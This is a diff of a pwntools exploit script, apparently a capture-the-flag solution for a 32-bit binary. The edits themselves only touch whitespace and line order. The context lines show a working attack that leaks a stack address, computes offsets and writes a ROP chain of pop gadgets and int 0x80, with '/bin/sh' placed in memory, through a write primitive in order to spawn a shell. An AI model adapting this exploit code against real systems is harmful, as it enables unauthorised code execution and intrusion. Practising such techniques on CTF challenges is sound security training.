@@ -27,7 +27,6 @@ def ddebug(b=""):
     gdb.attach(io, gdbscript=b)
     pause()
 
-# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
 
 environ = 0x080F1B44
 new_ebp = 0x80EF8A8
@@ -38,9 +37,9 @@ io.recvuntil("love 0x", drop=True)
 leak = int(io.recvuntil(",", drop=True), 16)
 log.success("leak:-----> " + hex(leak))
 
-att_offset =  0xfff61a9c - 0xfff61910 
+att_offset = 0xfff61a9c - 0xfff61910
 new_att = leak - att_offset
-ebp_addr = leak - 0x164 
+ebp_addr = leak - 0x164
 
 """
 0x08049d5a : int 0x80
@@ -50,8 +49,8 @@ ebp_addr = leak - 0x164
 
 """
 int80 = 0x08049d5a
-binsh2 = 0x68732f
 binsh1 = 0x6e69622f
+binsh2 = 0x68732f
 binsh = new_ebp+0x200
 pop_eax = 0x080b480a
 pop_ebx = 0x08049022
@@ -63,7 +62,7 @@ thj = [
     (new_ebp, new_ebp+0x100),
     (binsh, binsh1),
     (binsh+4, binsh2),
-    (new_ebp+4*1, pop_ebx), # rop开始
+    (new_ebp+4*1, pop_ebx),  # rop开始
     (new_ebp+4*2, binsh),
     (new_ebp+4*3, pop_ecx),
     (new_ebp+4*4, 0),
@@ -75,6 +74,7 @@ thj = [
 
 io.sendlineafter("where would you go?", hex(new_att))
 io.sendlineafter("What would you bring there? ", hex(len(thj)+1))
+
 
 def thj_write(k, v):
     io.sendlineafter("ordering", hex(environ))
